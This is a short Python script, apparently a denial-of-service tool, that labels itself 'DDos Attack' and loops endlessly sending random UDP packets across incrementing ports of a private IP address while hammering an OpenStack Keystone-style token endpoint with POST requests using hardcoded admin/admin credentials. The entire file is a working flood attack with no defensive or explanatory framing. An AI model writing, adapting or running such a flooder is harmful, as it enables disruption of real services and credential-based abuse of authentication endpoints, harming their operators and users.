import sys
import os
import time
import socket
import random
import requests
import json

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")


ip = '192.168.53.186'

port = 5000


payload ={ "auth": {
    "identity": {
        "methods": ["password"],
        "password": {
            "user": {
              "name": "admin",
              "domain": { "name": "Default" },
              "password": "admin"
            }
          }
        },
        "scope": {
          "project": {
            "name": "admin",
            "domain": { "name": "Default" }
          }
        }
      }
}

os.system("clear")
os.system("figlet Attack Starting")


while True:
     sock.sendto(bytes, (ip,port))
     res = requests.post('http://192.168.53.186:5000/v3/auth/token',
					headers = {'content-type' : 'application/json'},
					data= json.dumps(payload))
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(res,ip,port))
     if port == 65534:
       port = 1
